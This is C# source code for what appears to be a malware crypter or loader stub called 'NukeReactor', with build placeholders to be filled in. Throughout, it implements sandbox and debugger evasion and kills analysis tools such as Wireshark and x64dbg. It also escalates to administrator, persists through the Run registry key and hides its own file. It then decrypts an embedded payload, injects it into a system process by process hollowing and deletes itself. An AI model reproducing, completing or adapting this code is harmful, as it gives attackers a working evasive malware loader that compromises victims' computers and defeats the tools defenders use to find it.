using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Management;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Threading;
#if UseAssembly
using System.Runtime.CompilerServices;
[assembly: AssemblyTitle("%TITLE%")]
[assembly: AssemblyDescription("%DESC%")]
[assembly: AssemblyCompany("%COMPANY%")]
[assembly: AssemblyProduct("%PRODUCT%")]
[assembly: AssemblyCopyright("%COPYRIGHT%")]
[assembly: AssemblyTrademark("%TRADEMARK%")]
[assembly: AssemblyVersion("%VERSION%")]
[assembly: AssemblyFileVersion("%FILE_VERSION%")]
#endif

namespace NukeReactor
{
    internal class Runtime
    {
        static void Main(string[] args)
        {
            try
            {
                Thread.Sleep(6000);

#if AntiAnalysis
                new Thread(() => { AntiAnalysis.RunAntiAnalysis(); }).Start();
#endif
                Thread.Sleep(5000); 
#if RunAsAdmin
                if (!RunAsAdmin.IsRunAsAdmin())
                {
                    RunAsAdmin.RestartAsAdmin();
                    Environment.Exit(0);
                }
#endif

#if MutexControl
                MutexControl.MutexRuntime();
#endif

#if HideFile
                HideFile.HideAssembly();
#endif

#if Autorun
                Autorun.AutorunRuntime();
#endif

                byte[] payload = BytesDecryptor.Decrypt(Bytes.HexPayload);
#if NetInject
                NativeLoad.Execute("C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\%RANDOM_NET_INJECT%", payload);
#elif NativeInjection
                NativeLoad.Execute("C:\\Windows\\System32\\%NATIVE_RANDOM_INJECT%", payload);
#elif ReflexionInject
                NativeLoad.Execute(Bytes.HexLocate, payload);
#endif
            }
            catch
            {
                return;
            }
            finally
            {
#if MeltFile
                MeltFile.Melting();
#else
                Environment.Exit(0);
#endif
            }
        }
    }

    internal class BytesDecryptor
    {
        private static byte[] Key = new byte[] { /* your AES key */ };
        private static byte[] IV = new byte[] { /* your AES IV */ };

        internal static byte[] Decrypt(byte[] encryptedData)
        {
            using (var aes = Aes.Create())
            {
                aes.Key = Key;
                aes.IV = IV;
                using (var decryptor = aes.CreateDecryptor())
                {
                    return decryptor.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
                }
            }
        }
    }

#if ProtectFunctions
    public class XorBytes
    {
        private static byte key = 0x95;

        public static string XorDecrypt(string encryptedInput)
        {
            var decryptedChars = new List<string>();
            var numbers = encryptedInput.Split('%X%');

            foreach (var num in numbers)
            {
                int charCode;
                if (int.TryParse(num, out charCode))
                {
                    decryptedChars.Add(((char)(charCode ^ key)).ToString());
                }
            }

            return string.Concat(decryptedChars);
        }
    }
#endif

    internal class Bytes
    {
        public static byte[] HexPayload = new byte[] { };
#if ReflexionInject || MeltFile || RunAsAdmin || Autorun || HideFile
        public static string HexLocate = Process.GetCurrentProcess().MainModule.FileName;
#endif
    }

#if HideFile

    internal class HideFile
    {
        public static void HideAssembly()
        {
            string filePath = Bytes.HexLocate;
            FileAttributes attributes = File.GetAttributes(filePath);

            if ((attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
            {
                // Если нет, добавляем его
                File.SetAttributes(filePath, attributes | FileAttributes.Hidden);
            }
        }
    }
#endif

#if AntiAnalysis
    internal class AntiAnalysis
    {
        public static void RunAntiAnalysis()
        {
            if (DetectVirtualMachine() || DetectDebugger() || DetectSandboxie())
                Environment.FailFast(null);

            while (true)
            {
                DetectProcess();
                Thread.Sleep(10);
            }
        }

        private static bool DetectVirtualMachine()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }
        private static bool DetectDebugger()
        {
            bool isDebuggerPresent = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            return isDebuggerPresent;
        }

        private static bool DetectSandboxie()
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
                return true;
            else
                return false;
        }

        private static void DetectProcess()
        {
            foreach (Process process in Process.GetProcesses())
            {
                try
                {
                    if (ProcessName.Contains(process.ProcessName))
                        process.Kill();
                }
                catch { }
            }
        }

        private readonly static List<string> ProcessName = new List<string>
        {"dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
        "de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor",
        "Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james",
        "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida -", "charles", "dnspy", "simpleassembly", "peek",
        "httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb",
        "kgdb", "mdb", "ollydbg", "dumper", "wireshark", "httpdebugger", "http debugger", "fiddler", "decompiler", "unpacker",
        "deobfuscator", "de4dot", "confuser", " /snd", "x64dbg", "x32dbg", "x96dbg", "process hacker", "dotpeek", ".net reflector",
        "ilspy", "file monitoring", "file monitor", "files monitor", "netsharemonitor", "fileactivitywatcher", "fileactivitywatch", "windows explorer tracker", "process monitor", "disk pluse",
        "file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor",
        "soap monitor", "ProcessHacker", "internet traffic agent", "socketsniff", "networkminer", "network debugger", "HTTPDebuggerUI", "mitmproxy", "python", "mitm", "Wireshark","UninstallTool", "UninstallToolHelper", };

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
    }
#endif

#if MutexControl
    internal class MutexControl
    {
        public static void MutexRuntime()
        {
            string keyName = @"SOFTWARE\" + "%MUTEX%";

            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(keyName);
            if (registryKey != null)
            {
                registryKey.Close();
                Environment.FailFast("");
            }
            else
            {
                Registry.CurrentUser.CreateSubKey(keyName);
            }
        }
    }
#endif

#if Autorun
internal class Autorun
{
    private const string RegistryPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    private const string AutorunName = "666999666";

    public static void AutorunRuntime()
    {
        string currentLocation = Bytes.HexLocate;

        string[] possiblePaths = {
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            Path.GetTempPath(),
            Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments)
        };

        Random random = new Random();
        string targetDirectory = possiblePaths[random.Next(possiblePaths.Length)];

        string targetPath = Path.Combine(targetDirectory, Path.GetFileName(currentLocation));

        try
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(RegistryPath, writable: true))
            {
                if (key.GetValue(AutorunName) == null)
                {
                    key.SetValue(AutorunName, targetPath);
                    File.Copy(currentLocation, targetPath);
                }
            }
        }
        catch
        {
            return;
        }
    }
}
#endif

#if MeltFile
    internal class MeltFile
    {
        public static void Melting()
        {
            var fileName = Bytes.HexLocate;
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);

            var arguments = "/c timeout /t 1 && DEL /f " +currentProcessFileName;
            var processStartInfo = new ProcessStartInfo()
            {
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = arguments,
                WorkingDirectory = folder,
            };

            Process.Start(processStartInfo);
            Environment.Exit(0);
        }
    }
#endif

#if RunAsAdmin
    internal class RunAsAdmin
    {
        public static bool IsRunAsAdmin()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        public static void RestartAsAdmin()
        {
            var processInfo = new ProcessStartInfo
            {
                FileName = Bytes.HexLocate,
                UseShellExecute = true,
                Verb = "runas"
            };

            try
            {
                Process.Start(processInfo);
            }
            catch { return; }
        }
    }
#endif

    public static class NativeLoad
    {
        #region API delegate
        private delegate int DelegateResumeThread(IntPtr handle);
        private delegate bool DelegateWow64SetThreadContext(IntPtr thread, int[] context);
        private delegate bool DelegateSetThreadContext(IntPtr thread, int[] context);
        private delegate bool DelegateWow64GetThreadContext(IntPtr thread, int[] context);
        private delegate bool DelegateGetThreadContext(IntPtr thread, int[] context);
        private delegate int DelegateVirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);
        private delegate bool DelegateWriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        private delegate bool DelegateReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);
        private delegate int DelegateZwUnmapViewOfSection(IntPtr process, int baseAddress);
        private delegate bool DelegateCreateProcessA(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes,
            bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);
        #endregion

        #region API
        private static readonly DelegateResumeThread ResumeThread = LoadApi<DelegateResumeThread>("kernel32", "ResumeThread");
        private static readonly DelegateWow64SetThreadContext Wow64SetThreadContext = LoadApi<DelegateWow64SetThreadContext>("kernel32", "Wow64SetThreadContext");
        private static readonly DelegateSetThreadContext SetThreadContext = LoadApi<DelegateSetThreadContext>("kernel32", "SetThreadContext");
        private static readonly DelegateWow64GetThreadContext Wow64GetThreadContext = LoadApi<DelegateWow64GetThreadContext>("kernel32", "Wow64GetThreadContext");
        private static readonly DelegateGetThreadContext GetThreadContext = LoadApi<DelegateGetThreadContext>("kernel32", "GetThreadContext");
        private static readonly DelegateVirtualAllocEx VirtualAllocEx = LoadApi<DelegateVirtualAllocEx>("kernel32", "VirtualAllocEx");
        private static readonly DelegateWriteProcessMemory WriteProcessMemory = LoadApi<DelegateWriteProcessMemory>("kernel32", "WriteProcessMemory");
        private static readonly DelegateReadProcessMemory ReadProcessMemory = LoadApi<DelegateReadProcessMemory>("kernel32", "ReadProcessMemory");
        private static readonly DelegateZwUnmapViewOfSection ZwUnmapViewOfSection = LoadApi<DelegateZwUnmapViewOfSection>("ntdll", "ZwUnmapViewOfSection");
        private static readonly DelegateCreateProcessA CreateProcessA = LoadApi<DelegateCreateProcessA>("kernel32", "CreateProcessA");
        #endregion

        #region CreateAPI
        [DllImport("kernel32", SetLastError = true)]
        private static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
        private static CreateApi LoadApi<CreateApi>(string name, string method)
        {
            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
        }
        #endregion

        #region Structure
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;
            public readonly IntPtr ThreadHandle;
            public readonly uint ProcessId;
            private readonly uint ThreadId;
        }
        [StructLayout(LayoutKind.Sequential, Pack = 0x1)]
        private struct StartupInformation
        {
            public uint Size;
            private readonly string Reserved1;
            private readonly string Desktop;
            private readonly string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 0x24)] private readonly byte[] Misc;
            private readonly IntPtr Reserved2;
            private readonly IntPtr StdInput;
            private readonly IntPtr StdOutput;
            private readonly IntPtr StdError;
        }
        #endregion

        public static void Execute(string path, byte[] payload)
        {
            for (int i = 0; i < 5; i++)
            {
                int readWrite = 0x0;
                StartupInformation si = new StartupInformation();
                ProcessInformation pi = new ProcessInformation();
                si.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
                try
                {
                    if (!CreateProcessA(path, string.Empty, IntPtr.Zero, IntPtr.Zero, false, 0x00000004 | 0x08000000, IntPtr.Zero, null, ref si, ref pi)) throw new Exception();
                    int fileAddress = BitConverter.ToInt32(payload, 0x3C);
                    int imageBase = BitConverter.ToInt32(payload, fileAddress + 0x34);
                    int[] context = new int[0xB3];
                    context[0x0] = 0x10002;
                    if (IntPtr.Size == 0x4)
                    { if (!GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                    else
                    { if (!Wow64GetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                    int ebx = context[0x29];
                    int baseAddress = 0x0;
                    if (!ReadProcessMemory(pi.ProcessHandle, ebx + 0x8, ref baseAddress, 0x4, ref readWrite)) throw new Exception();
                    if (imageBase == baseAddress)
                        if (ZwUnmapViewOfSection(pi.ProcessHandle, baseAddress) != 0x0) throw new Exception();
                    int sizeOfImage = BitConverter.ToInt32(payload, fileAddress + 0x50);
                    int sizeOfHeaders = BitConverter.ToInt32(payload, fileAddress + 0x54);
                    bool allowOverride = false;
                    int newImageBase = VirtualAllocEx(pi.ProcessHandle, imageBase, sizeOfImage, 0x3000, 0x40);
                    if (newImageBase == 0x0)
                    {
                        allowOverride = true;
                        newImageBase = VirtualAllocEx(pi.ProcessHandle, 0x0, sizeOfImage, 0x3000, 0x40);
                        if (newImageBase == 0x0) throw new Exception();
                    }
                    if (!WriteProcessMemory(pi.ProcessHandle, newImageBase, payload, sizeOfHeaders, ref readWrite)) throw new Exception();
                    int sectionOffset = fileAddress + 0xF8;
                    short numberOfSections = BitConverter.ToInt16(payload, fileAddress + 0x6);
                    for (int x = 0; x < numberOfSections; x++)
                    {
                        int virtualAddress = BitConverter.ToInt32(payload, sectionOffset + 0xC);
                        int sizeOfRawData = BitConverter.ToInt32(payload, sectionOffset + 0x10);
                        int pointerToRawData = BitConverter.ToInt32(payload, sectionOffset + 0x14);
                        if (sizeOfRawData != 0x0)
                        {
                            byte[] sectionData = new byte[sizeOfRawData];
                            Buffer.BlockCopy(payload, pointerToRawData, sectionData, 0x0, sectionData.Length);
                            if (!WriteProcessMemory(pi.ProcessHandle, newImageBase + virtualAddress, sectionData, sectionData.Length, ref readWrite)) throw new Exception();
                        }
                        sectionOffset += 0x28;
                    }
                    byte[] pointerData = BitConverter.GetBytes(newImageBase);
                    if (!WriteProcessMemory(pi.ProcessHandle, ebx + 0x8, pointerData, 0x4, ref readWrite)) throw new Exception();
                    int addressOfEntryPoint = BitConverter.ToInt32(payload, fileAddress + 0x28);
                    if (allowOverride) newImageBase = imageBase;
                    context[0x2C] = newImageBase + addressOfEntryPoint;
                    if (IntPtr.Size == 0x4)
                    { if (!SetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                    else
                    { if (!Wow64SetThreadContext(pi.ThreadHandle, context)) throw new Exception(); }
                    if (ResumeThread(pi.ThreadHandle) == -0x1) throw new Exception();
                    return;
                }
                catch
                {
                    Process.GetProcessById(Convert.ToInt32(pi.ProcessId)).Kill();
                }
            }
            throw new InvalidOperationException();
        }
    }

}